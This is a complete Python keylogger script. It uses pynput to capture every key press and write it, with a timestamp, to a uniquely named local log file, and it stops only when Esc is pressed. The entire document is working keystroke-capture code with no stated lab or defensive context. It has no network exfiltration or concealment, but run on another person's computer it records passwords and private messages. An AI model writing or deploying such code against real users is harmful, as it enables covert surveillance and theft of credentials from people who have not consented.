
from pynput import keyboard
from datetime import datetime

# Log file name — unique every time
log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Function to log key presses
def on_press(key):
    time_stamp = datetime.now().strftime("[%H:%M:%S] ")
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(time_stamp + key.char + "\n")
    except AttributeError:
        # For special keys like space, enter, esc, etc.
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(time_stamp + f"[{key.name}]\n")

# Function to stop listener
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop logging when Esc is pressed

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

